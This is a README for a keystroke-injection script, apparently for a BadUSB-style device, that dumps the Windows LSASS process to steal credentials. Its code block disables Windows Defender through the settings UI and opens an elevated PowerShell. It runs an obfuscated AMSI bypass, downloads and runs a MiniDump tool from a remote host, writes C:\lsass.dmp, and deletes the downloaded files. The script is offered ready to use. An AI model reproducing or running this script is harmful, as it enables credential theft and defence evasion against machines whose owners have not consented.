# Credentials - Dump LSASS Process

## Description

This script will download MiniDump, extract it, run it to dump LSASS process to "C:\\lsass.dmp" or where you want.

## Requirement

1. First note this script has been created and tested under Windows 11 Build 22000.
2. I used a QWERTZ keyboard to do this ("ch" layout), so you may need to change that.

## DEMO

<img src="https://github.com/V0lk3n/HIDScripts/blob/main/demo/Credentials/demo-lsass_dump.gif"/>

## Code

```bash
layout("ch")
press("GUI r")
delay(1000)
type("windowsdefender:")
press("ENTER")
delay(1000)
press("ENTER")
delay(1000)
press("TAB")
press("TAB")
press("TAB")
press("TAB")
press("ENTER")
delay(1000)
press("SPACE")
delay(1000)
press("LEFT")
delay(1000)
press("ENTER")
delay(1000)
press("GUI r")
delay(200)
type("powershell.exe start-process powershell -verb runas")
press("ENTER")
delay(1500)
press("LEFT")
press("ENTER")
delay(1000)
type("[Ref].Assembly.GetType('System.Management.Automation.Amsi'+[char]85+'tils').GetField('ams'+[char]105+'InitFailed','NonPublic,Static').SetValue($null,$true)")
press("ENTER")
delay(1000)
type("(New-Object System.Net.WebClient).DownloadFile('https://github.com/V0lk3n/OSEP-CheatSheet/releases/download/MiniDump/MiniDump.zip','C:\\MiniDump.zip')")
press("ENTER")
delay(1000)
type("cd /")
press("ENTER")
delay(500)
type("mkdir MiniDump")
press("ENTER")
delay(500)
type("Expand-Archive -Path MiniDump.zip -DestinationPath C:\\MiniDump")
press("ENTER")
delay(1500)
type("cd MiniDump")
press("ENTER")
delay(500)
type(".\\MiniDump.exe")
press("ENTER")
delay(1000)
type("C:\\lsass.dmp")
press("ENTER")
delay(1000)
type("cd /")
press("ENTER")
type("rmdir MiniDump")
press("ENTER")
delay(1000)
type("T")
press("ENTER")
delay(1000)
type("del MiniDump.zip")
press("ENTER")
delay(500)
type("exit")
press("ENTER")
delay(1000)
press("SPACE")
delay(1000)
press("ALT F4")
```
